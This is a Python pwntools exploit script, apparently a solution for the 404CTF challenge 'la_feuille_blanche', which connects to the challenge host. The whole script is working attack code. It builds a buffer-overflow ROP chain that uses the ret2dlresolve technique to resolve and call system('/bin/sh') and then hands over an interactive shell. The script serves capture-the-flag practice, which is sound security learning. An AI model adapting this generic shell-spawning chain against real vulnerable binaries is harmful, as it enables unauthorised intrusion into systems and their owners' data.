#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('la_feuille_blanche')

host = args.HOST or 'challenges.404ctf.fr'
port = int(args.PORT or 31822)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)
context.terminal = ['xfce4-terminal','-e']
gdbscript = '''
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

OFFSET = cyclic_find(0x61616169)

rop = ROP(exe)

# create the dlresolve object
dlresolve = Ret2dlresolvePayload(exe, symbol='system', args=['/bin/sh'])

rop.raw(b'A' * OFFSET)
rop.read(0, dlresolve.data_addr)             # read to where we want to write the fake structures
rop.ret2dlresolve(dlresolve)                 # call .plt and dl-resolve() with the correct, calculated reloc_offset

io.sendline(rop.chain())
io.sendline(dlresolve.payload)                # now the read is called and we pass all the relevant structures in


io.interactive()

